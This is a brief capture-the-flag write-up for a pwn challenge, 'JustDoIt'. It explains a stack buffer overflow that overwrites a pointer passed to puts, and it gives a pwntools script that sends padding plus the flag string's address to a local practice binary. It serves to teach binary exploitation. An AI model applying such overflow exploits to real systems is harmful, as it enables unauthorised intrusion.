# JustDoIt (pwn)
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/9422e84b-0145-46e4-b3eb-10e10899194e)  

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/58915c71-6dbf-4ba1-952d-1588e610451e)  

Running the program asks for a password, and then quits if we don't provide the correct one.  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/5ff0b70d-ac64-45a0-87ef-aa63f0b7ffeb)  

Let's load it into Ghidra and see what we find  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/c95f0057-a855-4d8c-99a8-8000244dc744)  

Since this challenge is almost identical to [tamu19_pwn1](/Nightmare/2.Stack_Buffer_Overflows/Basic/tamu19_pwn1.md) I won't go into deep detail. 
The difference is that we can now overwrite the variable that is being passed into `puts`, so we should overwrite it with the address of the string containing the flag.  

```python
from pwn import *

flag_addr = 0x0804a080

exploit = b'A'*20 + p32(flag_addr)
r = process('./just_do_it')
r.sendline(exploit)
r.interactive()
```

![image](https://github.com/AndreQuimper/Writeups/assets/96965806/53d48a81-3ad1-419d-8dcd-c37c59c535ba)  




